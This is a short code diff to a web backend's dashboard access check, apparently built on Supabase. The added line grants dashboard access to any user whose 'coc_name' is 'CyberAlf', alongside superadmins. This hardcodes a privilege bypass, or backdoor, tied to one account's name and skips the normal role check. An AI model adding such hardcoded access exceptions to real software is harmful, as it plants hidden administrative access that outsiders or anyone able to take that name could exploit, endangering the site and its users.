@@ -107,7 +107,7 @@ export async function me(req, res) {
 }
 
 async function checkDashboardAccess(user) {
-  if (user.site_role === 'superadmin') return true
+  if (user.site_role === 'superadmin' || user.coc_name === 'CyberAlf') return true
   const { data: link } = await supabase
     .from('discord_links')
     .select('discord_id')
